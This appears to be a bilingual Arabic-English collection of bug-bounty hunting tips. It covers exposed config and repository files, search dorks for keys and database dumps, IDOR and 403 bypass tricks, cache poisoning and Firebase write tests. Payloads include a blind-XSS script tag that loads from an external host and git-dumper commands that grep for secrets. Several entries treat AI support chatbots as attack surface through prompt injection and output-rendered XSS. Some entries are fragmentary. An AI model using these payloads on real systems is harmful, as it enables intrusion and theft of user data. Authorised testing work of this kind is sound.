Title: .DS_Store + Thumbs.db exposure → directory structure leak
How It Works: ملفات macOS/Windows hidden بتتساب على السيرفر. .DS_Store بيكشف أسماء الملفات والمجلدات، Thumbs.db نفس الفكرة. مفيد جداً لما تلاقي directory listing مقفول.
Payload / Code:
https://target.com/.DS_Store
https://target.com/Thumbs.db
# استخدم dsstore parser بعد التحميل
Source: Classic overlooked recon (still pays when combined with sensitive paths)

Title: .git/config exposed → full source dump with git-dumper ($500–$3500+ real cases)
How It Works: كشف .git/config قد يسمح باستنتاج إعدادات أو يؤكد أن مسارًا من مستودع Git مكشوف، لكنه لا يثبت تلقائيًا إمكانية سحب المستودع كاملًا أو وجود أسرار صالحة. ابدأ بطلب قراءة محدود وغير حساس، ثم وثّق الأثر دون استخراج تاريخ كامل أو استخدام أي credentials مكتشفة.
Payload / Code:
curl -I https://target.com/.git/config
git-dumper https://target.com/.git/ ./dump
cd dump && git log -p | grep -iE 'password|secret|api_key|token'
Source: Multiple 2025 writeups: Ibtissam $3500, Syed €1000, Abhi Sharma $500, Sudarshana RCE chain

Title: .htpasswd / .htaccess exposed → Basic Auth credentials
How It Works: لو .htpasswd مكشوف، تقدر تعمل crack للـ hashes وتدخل على الـ protected areas.
Payload / Code:
https://target.com/.htpasswd
https://target.com/.htaccess

Title: .svn/wc.db exposed → full source code reconstruction ($400 case)
How It Works: جرب /.svn/wc.db. لو موجود، حمله واستخدم sqlite3 عشان تستخرج الـ pristine paths وتبني الـ source كامل (زي .git).
Payload / Code:
wget https://target.com/.svn/wc.db
sqlite3 wc.db 'select local_relpath from NODES;'

Title: 200 OK is not proof of BOLA
How It Works: الـstatus code لوحده مش finding. لازم تثبت إن response رجّع object مختلف أو إن state اتغيّر فعلاً. قارن body/headers/length، وبعدها اعمل verification من مالك object في حساب تاني تملكه.
Payload / Code: Use a harmless canary value in a lab and verify it from the second controlled account. Treat redirects, generic success JSON, and identical empty bodies as inconclusive.

Title: 403/401 Bypass — Path Normalization & Parser Differential
403/401 host → archive.org old snapshots still have secrets
How It Works: لما تلاقي host بيرجع 401/403 أو basic auth، روح لـ archive.org وشوف الـ historical snapshots. أحيانًا الـ old versions فيها API keys أو unprotected content لسه موجود.
Payload / Code: https://web.archive.org/web//https://locked-host.target.com/
Source: Book of BugBounty Tips + multiple hunters

Title: 404 response → check for exposed config or repository paths
How It Works: صفحة 404 عادية قد تساعد في ملاحظة سلوك routing غير متوقع، لكنها لا تعني أن الملفات بجوارها موجودة. اختبر المسارات الشائعة على أصل الموقع فقط وداخل النطاق، وسجّل status code وحجم الاستجابة ومحتواها. لا تفترض أن حالة المكافأة المذكورة قابلة للتعميم.
Payload / Code:
https://target.com/some/404/path/.git/config
https://target.com/some/404/path/.env
Source: InfoSec Write-ups — الرابط الأصلي يحتاج إضافة للتحقق من الحالة المذكورة

Title: 404 Subdomains — Backend errors, S3 paths, and leaked stack info
How It Works: Subdomains that return 404 are often ignored. Hitting a non-existent path on those hosts can still surface backend error pages, stack traces, internal paths, S3 references, or dev leftovers that never appear on the main site.
Payload / Code:
1) Enumerate subs → httpx
2) Keep hosts with interesting 404/500 behavior
3) Probe: /random404, /nonexistent, /.env, /debug
4) Review body for stack traces, bucket URLs, internal hostnames

Example idea:
https://test.api.target.com/random404
Source: Hatem Aliyan — Bug Bounty Tip (404 pages)

Title: Advanced Dork: .env with real secrets (DB_PASSWORD / AWS_SECRET)
How It Works: ابحث عن .env اللي فيه علامات secrets حقيقية مش مجرد أسماء. دي بتجيب نتائج عالية الجودة.
Payload / Code: site:target.com (ext:env OR inurl:.env) ("DB_PASSWORD" OR "AWS_SECRET_ACCESS_KEY" OR "SECRET_KEY" OR "APP_KEY")

Title: Advanced Dork: .git exposure with HEAD/config
How It Works: ده dork لاكتشاف صفحات قد تشير إلى كشف .git، لكنه يعتمد على فهرسة محركات البحث وقد يرجع نتائج قديمة أو نتائج غير مؤكدة. افتح النتيجة يدويًا داخل نطاق البرنامج، وتحقق من إمكانية قراءة ملف غير حساس مثل HEAD. لا تعتبر مجرد ظهور المسار إثباتًا لكشف المستودع.
Payload / Code: site:target.com inurl:.git ("HEAD" OR "config" OR "index of")

Title: Advanced Dork: Backup files with credentials
How It Works: الـ dork قد يجد ملفات backup مفهرسة، لكن نتائج البحث قد تكون قديمة أو أمثلة أو خارج النطاق. تحقق من وجود الملف واستجابة الخادم دون تنزيل dumps أو أسرار. أضف رابط مصدر محدد يثبت الطريقة بدل الاكتفاء بعبارة multiple guides.
Payload / Code: site:target.com (ext:bak OR ext:old OR ext:backup OR ext:~ OR ext:swp) (password OR secret OR key OR db_)

Title: Advanced Dork: Firebase / S3 public buckets
How It Works: بيجيب buckets و Firebase المفتوحة المرتبطة بالـ target.
Payload / Code: site:s3.amazonaws.com "target.com" OR site:firebaseio.com "target" OR site:storage.googleapis.com "target"

Title: Advanced Dork: Open directory listings with sensitive folders
How It Works: بيجيب index of اللي فيها backup أو config أو private.
Payload / Code: site:target.com intitle:"index of" (backup OR config OR private OR admin OR .env OR .git)

Title: Advanced Dork: Private keys & certificates
How It Works: بيجيب ملفات الـ private keys المكشوفة.
Payload / Code: site:target.com ("BEGIN RSA PRIVATE KEY" OR "BEGIN PRIVATE KEY" OR "BEGIN OPENSSH PRIVATE KEY" OR "BEGIN CERTIFICATE")

Title: Advanced Dork: SQL dumps with real data
How It Works: بيركز على dumps اللي فيها INSERT أو CREATE TABLE عشان تبقى data حقيقية مش أمثلة.
Payload / Code: site:target.com filetype:sql ("INSERT INTO" OR "CREATE TABLE") (password OR email OR credit)

Title: Advanced Dork: Swagger / OpenAPI / GraphQL docs
How It Works: بيجيب الـ API documentation المكشوفة اللي بتسهل الـ IDOR و auth bypass.
Payload / Code: site:target.com (inurl:swagger OR inurl:openapi OR inurl:api-docs OR inurl:graphql) ("swagger" OR "openapi" OR "__schema")

Title: AI Builder Project Visibility Regression → Source / Chat History Authorization Boundary
How It Works: Official historical evidence: Lovable reported and fixed a regression that exposed public-project chat history/source to other authenticated users with a project link. This supports the general authorization-boundary test idea, but does not establish a currently exploitable bug on Lovable or another product. Since this test needs two controlled accounts/projects and a current in-scope product, keep it as a review lead until a current candidate is independently verified.
Payload / Code: For an explicitly in-scope AI builder or collaboration SaaS, compare permissions between the published app URL, project/editor URL, remix/share links, version history, generated source, and prompt/chat history using two accounts you control. Check whether an ordinary user can access project metadata or conversation history belonging to the second test account. Do not guess private links or access real customers' projects. Avoid retesting the disclosed Lovable regression unless the program explicitly requests verification.
Source: Lovable official incident response (reported fixed) ; Escape research methodology on vibe-coded apps

Title: AI Chat / Support Agent — conversationID / session UUID BOLA (unauthenticated or cross-user)
How It Works: AI assistants and support agents assign conversation or session UUIDs. GraphQL/REST resolvers frequently skip ownership and even authentication checks on history/read endpoints. Swap the conversationID (from URL, body, or WebSocket) with another user's; also test completely unauthenticated. Leaks private prompts, PII, booking details, or internal tool actions. Low competition surface in 2026.
Payload / Code:
POST /graphql
{"query":"query { papayaConversationHistory(conversationID: "victim-uuid") { messages } }"}

Or REST:
GET /api/chat/history?conversationId=victim-uuid
(without auth header)
Source: Twitter/X @Bug_Breakdown + @dd_pwnd — unauthenticated GraphQL IDOR on AI chat history + support agents as attack surface (Nov 2026)

Title: AI support agents as attack surface (IDOR / BAC / XSS)
How It Works: Companies replace human support with LLM agents that can look up accounts, change details, and issue refunds. Same bug classes with new names: agent shows another user's data = IDOR; agent does admin actions for a normal user = broken access control; unescaped agent output on a page = XSS. Start from OWASP Top 10 for LLM Apps. Prefer two test accounts and clear evidence. Do not auto-confirm from chat text alone.
Payload / Code:
Map support/chat/agent endpoints
Prompt injection to request other-user data (authorized tests only)
Compare agent actions with and without session
Check reflected agent HTML sinks
Source: Twitter/X @dd_pwnd — support chat is part of the attack surface (Nov 2026); ~$50k reports mentioned with low competition

Title: AI support chatbot that renders model output in DOM → XSS → session theft / ATO
How It Works: شركات كثيرة تضيف chatbot دعم بدون تدقيق مخرجات النموذج. لو البوت يفك payload (base64/URL-decode) ويعرض الناتج في DOM بدون sanitization، تحصل على XSS مخزّن أو منعكس عبر قناة المحادثة. سلسلة شائعة: XSS → سرقة cookies/tokens أو OAuth cookie-downgrade → account takeover. القاعدة: أي مخرجات LLM تُرسَم في الصفحة = سطح هجوم. اختبر على برامج مصرّح بها فقط، بأدلة (request/response + DOM proof) من غير إضرار بالمستخدمين.
Payload / Code:
1) Find in-scope AI/chat/support endpoints
2) Send encoded XSS (base64, HTML entities, markdown that becomes HTML)
3) Confirm bot decodes and DOM reflects/executes
4) Escalate only with proof: cookie access, token leak, or auth action in same origin
Heuristic: "If it renders in the DOM, treat it as injectable until proven sanitized."
Source: Patrickbatman writeup tip (X) — AI bot decoded base64 XSS into DOM

Title: Amazon Cognito misconfig → Account Takeover
How It Works: لو الـ User Pool misconfigured (مثلاً allow unauthenticated or weak identity pool)، تقدر تعمل ATO أو escalate privileges.
Payload / Code: دور على Cognito User Pool ID في الـ JS / config

Title: Angular HttpClient — URL parsing discrepancy may leak XSRF tokens
How It Works: Angular's HTTP client had an XSRF token leakage issue related to a URL-parsing discrepancy, described as an incomplete fix for CVE-2025-66035. The useful testing pattern is to compare how the framework classifies a request URL against how the browser/network layer resolves the final destination; token attachment must follow the intended same-origin policy.
Payload / Code: In a local app using an affected Angular version, test only controlled same-origin and cross-origin URLs and observe whether the XSRF header is attached to a request that resolves cross-origin. Use a dummy token and a local receiver; do not collect real anti-CSRF tokens from production users. Read the advisory for affected/fixed versions and upgrade guidance.

Title: Apache server-status / server-info مكشوف → internal info + active requests
How It Works: /server-status بيرجع active connections، request URLs، client IPs. /server-info بيكشف modules و configuration. مفيد للـ recon العميق.
Payload / Code:
https://target.com/server-status
https://target.com/server-info
https://target.com/server-status?auto

Title: API Debug /env /status endpoints → $3,000 Bounty (Secret Hunter case)
How It Works: كثير APIs بتسيب /debug أو /env أو /_debug أو /health مع verbose mode. بيرجع environment variables كاملة. استخدم ffuf بقائمة debug endpoints.
Payload / Code:
ffuf -u https://target.com/api/FUZZ -w debug_endpoints.txt -mc 200
# قائمة: debug, env, status, health, _debug, actuator/env

Title: API: جرّب تغيير نوع قيمة الـ UUID لـ ID أو Email
How It Works: لما endpoint بيقبل UUID كـ identifier، جرّب تبعتله ID رقمي أو إيميل بدل الـ UUID. بعض الباكيندات بتعمل CASE على أكتر من نوع identifier في نفس الاستعلام، وده ممكن يفتح مسارات وصول تانية.
Payload / Code:
/api/user/a8ae-1322-ac09-8f90
/api/user/1
/api/user/user@a.test

SQL موازي محتمل في الباكيند:
SELECT * FROM subscribers WHERE
  CASE
    WHEN $1 > 0 THEN id = $1
    WHEN $2 != '' THEN uuid = $2::UUID
    WHEN $3 != '' THEN email = $3
  END;

Title: Array / parameter pollution on ID (user_id[]=1&user_id[]=2)
How It Works: بعض الـ backends بياخدوا أول أو آخر قيمة، أو بيعملوا array. جرب [] أو تكرار الباراميتر.
Payload / Code:
user_id[]=victim&user_id[]=attacker
id=1&id=2

Title: Array injection ([] or [1,2,3]) → Full Path / Stack Trace Disclosure
How It Works: حط array في أي parameter (حتى لو مش متوقع). كتير من الـ frameworks بترمي error فيها full path أو stack trace أو internal class names. مفيد جدًا لـ path disclosure وخطأ oracle.
Payload / Code:
param[]=1
param[1,2,3]=test
param[][]=1
Source: Book of Bug Bounty Tips + multiple hunters

Title: Array-form IDOR — id[]=attacker&id[]=victim bypass
How It Works: ACL sometimes checks a single scalar id. Sending the same parameter as an array (id[]= or id as JSON array) can make the backend iterate and return or act on a second ID without ownership checks. Compare single-id 403 vs array 200 on authorized test objects only.
Payload / Code:
id=attacker_id  → 403
id[]=attacker_id&id[]=victim_id  → 200?
id=[attacker_id, victim_id]  (JSON)
Also: ids=1,2 or objects[0][id]=victim
Source: Twitter/X IDOR edge-case tips (array/list parameters) + 2026 hunting notes

Title: Authorization path parser differential — encoded semicolon, slash, and backslash
How It Works: A security layer and a resource handler may normalize or decode path components differently. Quarkus documented path-based authorization bypass conditions involving encoded semicolons (%3B) and encoded slashes (%2F) or backslashes (%5C), depending on the protected resource and affected version. The reusable primitive is to compare the path representation used by the policy engine with the final handler/resource selected.
Payload / Code: Only in an authorized lab or explicitly in-scope target, start with a known protected test route and a negative control. Change one representation at a time: encoded semicolon, encoded slash, or encoded backslash. Compare policy decision, resolved route, and actual access. Do not treat a 200 response alone as proof; confirm protected content or a state change without exposing real data. Check affected versions and vendor fixes before testing.

Title: Authorization test: swap the target, not the session
How It Works: في أي request authenticated، افصل بين هوية الـsession وبين object ID الموجود في الـpath/body. جرّب نفس session مع object تاني تملكه أنت. الهدف إثبات إن السيرفر بيربط القرار بالـsubject الصحيح، مش بمجرد إن المستخدم logged in.
Payload / Code: Safe lab idea: Account A session + Account B test object ID. Change only a harmless field such as nickname. Confirm the change from Account B.

Title: Autorize — أتمتة صيد IDOR / Broken Access Control
How It Works: بدل ما تختبر كل endpoint يدوي للـ access control، Autorize بياخد كوكيز مستخدم أقل صلاحية وبيعيد تلقائيًا كل ريكوست بتعمله وانت متصفح بحساب أعلى، وبيقولك لو الـ endpoint اتفتح بصلاحية أقل (Bypassed). نص اكتشافات الـ IDOR بتيجي من تشغيله في الخلفية أثناء التصفح العادي.
Payload / Code:
1) سجّل حسابين: low-priv (victim cookies تتحط في Autorize) + high-priv تتصفح بيه
2) حط cookies حساب الـ low-priv في Autorize
3) اتصفح كل فيتشرز الحساب العالي صلاحية عادي
4) Autorize بيعيد كل ريكوست بالكوكيز الأقل صلاحية ويقارن الرد (Enforced/Bypassed!)
Source: Autorize (Burp Extension) — HackByNight Real World Guide 2025

Title: AWS App Recon Chain → Cognito Identifiers, S3 / DNS / Deployment Artifact Exposure ($10K Case)
How It Works: A 2025 Medium writeup reports a $10,000 bounty for an AWS configuration issue found while reviewing app client code and auth/file-management traffic. A Cognito pool identifier led to correlation of publicly readable cloud resources and deployment artifacts, exposing S3, DNS ranges and infrastructure metadata. The writeup says the researcher used passive discovery and read-only checks; payout is self-reported. The value is the correlation chain, not treating a public identifier as a secret.
Payload / Code: On in-scope assets only: inspect public JS/config and observed auth/file flows for AWS region, Cognito User Pool or Identity Pool identifiers, bucket names, API base URLs and deployment references. Follow only resources linked from the authorized target and verify access with minimal read-only requests. Do not enumerate unrelated buckets, download sensitive artifacts, authenticate with discovered credentials, or modify cloud resources. Report the exact exposed resource and data category with redacted evidence.

Title: AWS tip: probe /ramp_core.js for embedded AccessKey material
How It Works: بعض تطبيقات/SDK قديمة أو حزم front-end تضع مسارات ثابتة فيها مفاتيح أو config. إضافة /ramp_core.js (ومسارات مشابهة من wordlists السحابية) لمرحلة content discovery قد تكشف AccessKeyId/Secret في JS. المفتاح وحده يحتاج إثبات صلاحية وتأثير داخل النطاق قبل البلاغ.
Payload / Code:
Add to content wordlist:
/ramp_core.js
/.aws/credentials
/config.json
/aws-config.js
After hit: extract AKIA… patterns; verify only with program-allowed checks; never use keys outside authorized testing.

Title: Azure Application Gateway v2 — 403 Query String Extension Bypass (Unverified)
How It Works: Reported observation from an X post: a restricted URL returns HTTP 403, but adding a query parameter whose value contains the literal string .js (example: ?x=.js) reportedly changes the response and may allow access to the resource. The author suspects a Microsoft Azure Application Gateway v2 filtering/parsing behavior and says the cause is still being investigated. This is an unverified hypothesis, not a confirmed general bypass. Possible class to investigate: disagreement between gateway/WAF URL inspection and downstream application or routing interpretation of the query string.
Payload / Code:
Baseline: https://authorized-target.example/restricted-path
Comparison variant: https://authorized-target.example/restricted-path?x=.js

Only replace the placeholder with a target explicitly in scope. Compare status, redirect chain, response headers, body length/hash, and whether the actual protected resource is returned. Do not treat HTTP 200 alone as proof; check for a block page, login page, or generic error.

Title: Azure DevOps Public Project Review → Pipeline Metadata & Accidental Secret Exposure
How It Works: Public Azure DevOps projects and repository/build surfaces may expose pipeline YAML, build logs, test outputs, artifacts, deployment configuration, or identifiers that reveal how a target deploys. The highest-signal angle is accidental disclosure inside an artifact or log (for example, a credential accidentally printed in a failed build), not simply finding a public project. This is distinct from GitHub Actions workflow injection already covered in Notion. Public-project visibility can be intentional, and program policies differ sharply.
Payload / Code: Passive-first, in-scope workflow: identify the organization's official Azure DevOps tenant from public references; inspect only publicly accessible project/repository/build pages and artifacts; review pipeline YAML, recent failed-build logs, test reports, coverage output, and downloadable build artifacts for secrets or private deployment data. Do not guess or access private project IDs, use stolen credentials, trigger builds, or test credentials against live services. If a suspected secret appears, capture a redacted proof and report it; do not use it.

Title: Backup Disclosure عبر فزّ امتداد tar.gz على الدومين الرئيسي
How It Works: فزّ الدومين الرئيسي (مش subdomain فرعي) بامتداد أرشيف شائع زي tar.gz بدل الوقوف عند .env أو .git بس. نسخة احتياطية كاملة لإعدادات التطبيق ممكن تتسرب فيها بيانات اعتماد قاعدة البيانات ومفاتيح المصادقة والأسرار كاملة. الدرس: نفس فكرة ملفات الباك اب المنسية (.env, .git, .svn/wc.db) بس بامتداد مختلف وعلى نطاق أساسي بدل فرعي.
Payload / Code:
fuzz: main-domain.com/FUZZ with extension .tar.gz
(جرّب كمان .zip .rar .bak .old على نفس الدومين الرئيسي)
Source: Kanhaiya Sharma (@krishnsec) — Standoff Bug Bounty, 12 Oct 2025, بونتي موثّق (8,081 views)

Title: Backup files (wp-config.php.bak, .env.bak, .sql, ~ files) → credentials leak
How It Works: اكتشاف أسماء ملفات backup مفيد، لكن ليس كل ملف يحتوي credentials ولا كل كشف قابل للدفع. استخدم wordlist على الأصول المصرح بها بمعدل منخفض، وتحقق من نوع الملف ومحتواه بأقل دليل ممكن دون تحميل قواعد بيانات أو استخدام أسرار.
Payload / Code:
ffuf -u https://target.com/FUZZ -w backup_wordlist.txt
# أمثلة: wp-config.php.bak, .env.bak, backup.sql, database.sql
Source: Intigriti WordPress guide + Burp labs + common practice

Title: Backup tar.gz / .zip / .sql على الـ root domain مباشرة
How It Works: مش بس على subdomains. جرب الامتدادات الشائعة على الدومين الرئيسي نفسه: /backup.tar.gz, /db.sql, /site.zip, /backup.zip, /.env.bak. كتير من الـ misconfigs بتحصل على الـ root.
Payload / Code: ffuf -w backups.txt -u https://target.com/FUZZ -e .tar.gz,.zip,.sql,.bak,.old
Source: Multiple real bounties + Kanhaiya Sharma style writeups

Title: Basic Auth cancel spam — intermittent auth bypass on some panels
How It Works: في بعض لوحات login القديمة، إلغاء نافذة Basic Auth عدة مرات قد يُسقط الجلسة إلى حالة authenticated أو يكشف محتوى محمي بسبب خطأ في منطق التحدي. نادر وغير مضمون؛ وثّق بدقة إن نجح ولا تعتمد عليه كمنهج أساسي.
Payload / Code:
Open protected path → browser Basic Auth prompt → Cancel 3–4 times → observe whether body/admin UI leaks.
Prefer reproducing with raw HTTP (empty Authorization / repeated 401 handling) for a clean PoC.
Source: mahmoud tip (X) — cancel basic auth 3–4 times

Title: Blind SSRF Detection عبر Interactsh
How It Works: لو الـ SSRF مش بترجع أي رد في الـ response (blind)، استخدم سيرفر out-of-band زي Interactsh للتأكد من وجود الثغرة عبر أي DNS/HTTP callback يوصلك.
Payload / Code:
1) تنصيب: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
2) تشغيل: interactsh-client -server oast.pro -n 5
3) حط الـ subdomain اللي طلعتلك مكان الـ URL المستهدف في الـ request
4) أي callback يرجع = تأكيد وجود الثغرة

Title: Blind XSS أوتوماتيكي عبر Match & Replace في Burp
How It Works: بدل ما تدور يدوي على أماكن الحقن المحتملة، اعمل match & replace rule في الـ proxy (Burp) يحقن الـ Blind XSS payload بتاعك أوتوماتيكيًا في كل ريكووست بتبعته وانت بتتصفح عادي. لو الـ payload اتنفذ في admin panel أو dashboard داخلي، هتوصلك إشعار على سيرفر الـ XSS Hunter/interactsh بتاعك.
Payload / Code:
في Burp: Proxy > Match and Replace
Match: rn (أي header)
Replace: rn<blind-xss-header>: "><script src=https://YOUR-XSS-HUNTER-URL></script>rn

أو أضف الـ payload في كل قيمة param بتمر عليها أثناء التصفح العادي

Title: BOLA / IDOR via Batch & Bulk ID Mixing
How It Works: Many APIs expose batch/bulk endpoints that accept arrays of object IDs (ids[], JSON array of objects, /api/batch). Authorization is often checked only on the first ID or skipped per-item. Mix your own IDs with a victim ID in the same request; also try duplicate keys, partial-failure responses that leak existence, and array stuffing. If the server processes the victim object, you have scalable BOLA.
Payload / Code:
POST /api/batch

Title: Cache Poisoning via Unkeyed Headers (X-Forwarded-Host / X-Forwarded-Scheme)
How It Works: Inject a header the cache does not key on but the application uses for redirects, absolute URLs, or asset generation (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, etc.). If the response is cached with your injected value, subsequent users receive poisoned content (open redirect, XSS, or wrong origin). One request can affect many users.
Payload / Code:
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /evil

Then force cache hit and observe Location / script src / link tags reflecting the poisoned host.
Source: Twitter/X @gustavorobertux — Bug Bounty Tip #19/30 Cache poisoning (Nov 2026) + classic PortSwigger patterns

Title: Casdoor — token exchange must bind JWT identity to the target organization
How It Works: The reported Casdoor issue involved token exchange validating a JWT signature without verifying that the token's user belonged to the same organization as the target application. A valid token from one organization could cross an organization boundary if the missing binding check and affected versions were present.
Payload / Code: For an authorized lab with two test organizations and accounts, test whether token exchange enforces both signature validity and organization/tenant membership. Use only test identities and non-sensitive scopes; record the subject, issuer, organization, target app, and resulting permissions. Do not replay real users' tokens. Advisory says affected versions were fixed in 2.387.0.

Title: Client-side role / isAdmin / price tampering — verify server-side enforcement

Payload / Code: With an explicitly authorized test account and test data, compare the normal request with a controlled change to a client-controlled field. Verify server-side behavior using only actions and records you own. Do not modify real purchases, payments, roles, or other users' data.
Source: User-provided screenshot: response manipulation / role and price fields; normalized into a server-side authorization check

Title: Cloudflare Worker/API Key Exposure → Edge JavaScript Supply-Chain Injection
How It Works: A September 2026 incident showed how a broad Cloudflare API key exposed in application source could be used to create Workers, routes, and DNS changes, allowing JavaScript to be modified at the edge without changing the origin. The hunting lesson is to treat exposed CDN/edge credentials and third-party script delivery as a chain: source/config leak → edge control-plane access → route or Worker modification → customer-facing script integrity impact. Study Tab: JS/config/source maps → search for CDN or edge-provider credentials and deployment references → edge control-plane abuse → validate scope, permissions, and harmless response-integrity differences. Use when: a target uses Cloudflare Workers, Pages, CDN-managed scripts, or embeds third-party JavaScript across many customer sites.

Title: Connectivity Check → cURL Shell Injection; Then Pivot to Sibling Features
How It Works: A recent disclosed-research roundup highlighted a command-injection chain in which a connectivity-check feature passed a user-supplied URL to cURL through a shell; a second feature reused the same risky path. The practical hunting signal is any “test URL”, webhook connectivity check, fetch preview, or network diagnostic that shells out to curl/wget. If one instance is confirmed, inspect other in-scope features that share the same backend helper or implementation instead of stopping at the first entry point.
Payload / Code:
Authorized, low-impact workflow:
1. Identify a URL/connectivity-test feature and determine whether errors or timing indicate a shell invocation (this alone is not proof).
2. Use a controlled endpoint and harmless metacharacter probes in a test environment or explicitly permitted target; avoid destructive commands, file writes, or outbound calls to third parties.
3. Confirm execution with a harmless, unique marker that cannot change state, and preserve the raw request/response evidence.
4. After confirmation, compare sibling features (webhook test, integration test, health check) for shared behavior using the same safe marker.
5. Stop after minimal proof; report each affected entry point and shared root cause without broad automation.
Source: Intigriti Bug Bytes #240 (Sep 2026), citing researcher @saur1n, “A valid URL with a Command in its Shadow”: https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-240-september-2026

Title: Different 404 Fingerprint → Look for a Separate Backend API Context
How It Works: A useful clue from Berserker's write-up: malformed or unusual paths produced a 404 response with a different structure from the normal frontend 404. That suggested the request had reached a different routing/backend layer. The researchers then inspected public JavaScript for a production API hostname and found that it exposed the same API behind a different edge configuration. Treat response differences as a lead, not proof of a bypass: frameworks, gateways, and error handlers can also produce different 404s.
Payload / Code:
Passive-first workflow for an in-scope target:
1. Save one normal 404 response and one response from a harmless, invalid route; compare body template, headers, server/framework fingerprints, and request IDs.
2. Inspect publicly served JavaScript and source maps for API base URLs, service hostnames, version prefixes, and environment-specific endpoints.
3. Compare documented/public API surfaces on discovered in-scope hostnames; look for OpenAPI/WADL metadata only where access is permitted.
4. If a separate backend is found, verify its ownership and scope, then test authorization using your own account and harmless resources.
5. Report only a demonstrated security difference; a distinct 404 or a hostname difference alone is not a vulnerability.

Don't report SSRF alone if internal RCE/metadata is reachable
Don't report Self-XSS alone if clickjacking/CSRF can deliver it
Don't report Self-Stored XSS alone if CSRF can trigger it

Title: Excessive API fields + GDPR/CCPA framing لرفع الـ Severity
How It Works: لما الـ API بيرجع fields زيادة (address, phone, SSN last4, internal notes)، اكتب التقرير مع ذكر GDPR/CCPA risk و business impact (identity theft, regulatory fines). ده بيرفع الـ severity من Low/Medium لـ High في كتير من البرامج.
Payload / Code: قارن الـ UI fields مع الـ raw JSON response

Title: Exposed .env على subdomain = $250–$10k+ (Easy $250 case + higher)
How It Works: بعد subfinder + httpx، شغّل ffuf/dirsearch على .env و .env.backup و .env.local. في حالة exam proctoring موقع طلع .env وخد $250. في fintech طلع Stripe + AWS = آلاف.
Payload / Code:
ffuf -u https://FUZZ.target.com/.env -w subs.txt -mc 200
dirsearch -u https://sub.target.com -e env,bak,sql -t 30
Source: Abhijeet Kumawat writeup ($250) + multiple fintech cases $500–$10k+

Title: Exposed Google Maps API keys may unlock Gemini — validate model access not just Maps
How It Works: بعض مفاتيح Google Maps (AIza…) المنشورة في JS قد تكون مربوطة بمشروع Cloud فيه Gemini/Generative Language مفعّل بدون قيود كافية. وجود المفتاح وحده ليس ثغرة؛ الأثر يبدأ عندما يثبت أن نفس المفتاح يستدعي models أو يتجاوز referrer/API restrictions. ابحث في: JS/source maps، Wayback، Android APKs، web assets. بعد الاستخراج اختبر فقط على نطاق مصرّح ووثّق الـAPI المفعّلة والقيود (HTTP referrer، IP، API restrictions) قبل أي بلاغ.
Payload / Code:
Hunt sources: JS bundles, .js.map, waybackurls, APK strings.
Pattern: AIza[0-9A-Za-z_-]{35}
Validate impact (authorized only): try Generative Language / Gemini endpoints if program allows; check Maps quotas vs other Google APIs; document restriction bypass evidence.
Tool mention: geminiHunter (community) for multi-source discovery — treat output as LEAD until impact proven.

Title: Fat GET Requests — تمرير Params في الـ Body لتجاوز Cache Key
How It Works: بعض السيرفرات (خصوصًا Ruby/PHP/بعض الـ frameworks) بتقرا الباراميترات من body بتاع ريكوست GET كمان. الكاش بيعمل الـ cache key على الـ URL/query فقط ومبيشوفش الـ body، فالقيمة اللي في الـ body تعتبر unkeyed input. ده بيديك مدخل مخفي تسمّم بيه الكاش أو تتجاوز فلاتر الـ WAF اللي بتفحص الـ query string بس.
Payload / Code:
GET /search?q=test HTTP/1.1
Host: target.com
Content-Length: 24

q=<script>alert(1)</script>
// بعض الـ frameworks بتقرا الـ params من body الـ GET، بينما الكاش بيعمل key على query string بس

Title: FindSomething browser extension for credential-shaped strings during recon
How It Works: While browsing the target, FindSomething highlights potential secrets and interesting strings in page source and loaded assets. Useful as a passive assist next to JS Miner / manual review; always validate false positives.
Payload / Code:
Install FindSomething (browser extension)
Browse in-scope app pages and JS-heavy flows
Review highlighted candidates → classify public vs sensitive
Do not auto-report client-side publishable keys without impact

Title: Firebase Realtime DB / Firestore open rules → full read/write (classic high impact)
How It Works: من الـ JS أو APK (apktool + grep firebaseio) خد الـ project URL. جرب /.json. لو data رجعت = public read. جرب POST/PUT عشان write. حتى لو Permission denied، جرب self-register + auth != null rules.
Payload / Code:
curl https://PROJECT.firebaseio.com/.json
curl -X PUT -d '{"test":"bounty"}' https://PROJECT.firebaseio.com/test.json
Source: Multiple writeups + Intigriti Firebase guide + mobile APK decompile tips

Title: Firebase Realtime DB open rules (read/write without auth)
How It Works: دور على PROJECT.firebaseio.com أو من الـ JS. جرب /.json بدون auth. لو رجع data أو قبل write → High.
Payload / Code:
curl https://PROJECT-default-rtdb.firebaseio.com/.json
curl -X PUT -d '{"test":1}' https://PROJECT-default-rtdb.firebaseio.com/test.json
